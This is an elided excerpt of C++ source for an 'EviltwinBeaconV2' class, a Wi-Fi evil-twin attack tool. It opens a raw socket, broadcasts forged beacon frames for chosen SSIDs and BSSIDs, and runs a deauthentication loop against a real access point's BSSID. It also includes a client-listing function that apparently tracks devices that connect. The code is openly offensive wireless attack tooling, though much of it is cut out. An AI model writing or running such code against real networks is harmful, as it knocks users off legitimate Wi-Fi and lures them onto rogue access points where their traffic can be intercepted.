...
EviltwinBeaconV2::EviltwinBeaconV2(const std::string& iface,
                                   const std::vector<std::string>& ssids,
                                   const std::vector<std::string>& bssids,
                                   uint8_t channel)
    : iface_(iface), ssids_(ssids), channel_(channel) {
    unsigned int b[6];
    for (const auto& bs : bssids) {
        std::array<uint8_t, 6> mac{};
        if (std::sscanf(bs.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                        &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6)
            for (int i = 0; i < 6; i++) mac[i] = (uint8_t)b[i];
        bssids_.push_back(mac);
    }
}

EviltwinBeaconV2::~EviltwinBeaconV2() { stop(); }

void EviltwinBeaconV2::set_real_bssid(const std::string& bssid) {
    unsigned int b[6];
...
void EviltwinBeaconV2::build_deauth_frame(uint8_t* buf, uint8_t frame_type,
...
int EviltwinBeaconV2::open_socket() {
...
void EviltwinBeaconV2::set_channel(int ch) {
...
void EviltwinBeaconV2::start() {
    if (running_.exchange(true)) return;
    beacon_worker_ = std::thread(&EviltwinBeaconV2::beacon_loop, this);
    beacon_worker_.detach();
}

void EviltwinBeaconV2::stop() {
    running_ = false;
...
void EviltwinBeaconV2::start_deauth() {
    if (!real_bssid_set_ || deauth_running_.exchange(true)) return;
    deauth_worker_ = std::thread(&EviltwinBeaconV2::deauth_loop, this);
    deauth_worker_.detach();
}

void EviltwinBeaconV2::stop_deauth() {
    deauth_running_ = false;
    if (deauth_worker_.joinable()) deauth_worker_.join();
}

std::vector<std::string> EviltwinBeaconV2::get_clients() const {
...
void EviltwinBeaconV2::beacon_loop() {
    int fd = open_socket();
    if (fd < 0) { running_ = false; return; }
    set_channel(channel_);

    size_t count = std::min(ssids_.size(), bssids_.size());
    if (count == 0) { ::close(fd); running_ = false; return; }
    ...
    while (running_) {
        ...
        for (int i = 0; i < batch && running_; i++) {
            const std::string& ssid = ssids_[idx % count];
            const uint8_t* bssid = bssids_[idx % count].data();
            idx++;

            int ssid_len = (int)ssid.size();
            ...
            std::memcpy(f + off, ssid.c_str(), (size_t)ssid_len); off += ssid_len;
            f[off++] = 1; f[off++] = 8;
...
void EviltwinBeaconV2::deauth_loop() {
    int fd = open_socket();
